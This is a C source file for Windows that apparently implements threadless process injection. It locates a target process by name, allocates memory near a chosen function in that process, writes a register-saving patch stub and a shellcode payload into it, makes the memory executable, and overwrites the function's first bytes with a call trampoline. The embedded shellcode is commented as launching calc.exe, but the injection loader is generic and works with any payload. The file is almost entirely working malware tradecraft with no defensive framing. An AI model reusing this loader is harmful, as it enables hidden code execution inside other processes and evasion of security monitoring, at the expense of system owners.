#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <tlhelp32.h>
// Shellcode and Patch Shellcode
const uint8_t PATCH_SHELLCODE[55] = {
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,
    0x48, 0xB9, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC,
    0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
    0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0,
};
// start calc.exe
const uint8_t SHELLCODE[106] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A, 0x60, 0x5A, 0x68, 0x63,
    0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18,
    0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F,
    0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF,
    0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
};

__declspec(dllexport) DWORD find_process(const char* process_name);
__declspec(dllexport) void write_shellcode(HANDLE h_process, void* address);
__declspec(dllexport) void install_trampoline(HANDLE h_process, void* address, void* function_address);
__declspec(dllexport) void* find_memory_role(SIZE_T func_address, HANDLE h_process);

__declspec(dllexport) DWORD find_process(const char* process_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 process_entry = { 0 };
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &process_entry)) {
        CloseHandle(snapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (strcmp(process_entry.szExeFile, process_name) == 0) {
            pid = process_entry.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &process_entry));

    CloseHandle(snapshot);
    return pid;
}

__declspec(dllexport) void* find_memory_role(SIZE_T func_address, HANDLE h_process) {
    SIZE_T address = (func_address & 0xFFFFFFFFFFF70000) - 0x70000000;
    while (address < func_address + 0x70000000) {
        void* tmp_address = VirtualAllocEx(
            h_process,
            (LPVOID)address,
            sizeof(SHELLCODE) + sizeof(PATCH_SHELLCODE),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (tmp_address) {
            printf("[+] Allocated at: %p\n", tmp_address);
            return tmp_address;
        }

        address += 0x10000;
    }

    return NULL;
}

__declspec(dllexport) void write_shellcode(HANDLE h_process, void* address) {
    SIZE_T number_of_write = 0;
    WriteProcessMemory(
        h_process,
        address,
        PATCH_SHELLCODE,
        sizeof(PATCH_SHELLCODE),
        &number_of_write
    );
    
    SIZE_T shellcode_address = (SIZE_T)address + sizeof(PATCH_SHELLCODE);
    WriteProcessMemory(
        h_process,
        (LPVOID)shellcode_address,
        SHELLCODE,
        sizeof(SHELLCODE),
        &number_of_write
    );

    DWORD old_protect;
    VirtualProtectEx(
        h_process,
        address,
        sizeof(SHELLCODE),
        PAGE_EXECUTE_READWRITE,
        &old_protect
    );
}

__declspec(dllexport) void install_trampoline(HANDLE h_process, void* address, void* function_address) {
    uint8_t trampoline[5] = {0xE8, 0x00, 0x00, 0x00, 0x00};
    DWORD rva = (DWORD)((SIZE_T)address - ((SIZE_T)function_address + sizeof(trampoline)));
    memcpy(trampoline + 1, &rva, sizeof(rva));

    DWORD old_protect;
    VirtualProtectEx(
        h_process,
        function_address,
        sizeof(trampoline),
        PAGE_READWRITE,
        &old_protect
    );

    SIZE_T number_bytes_written;
    WriteProcessMemory(
        h_process,
        function_address,
        trampoline,
        sizeof(trampoline),
        &number_bytes_written
    );

    VirtualProtectEx(
        h_process,
        function_address,
        sizeof(trampoline),
        PAGE_EXECUTE_READWRITE,
        &old_protect
    );
}
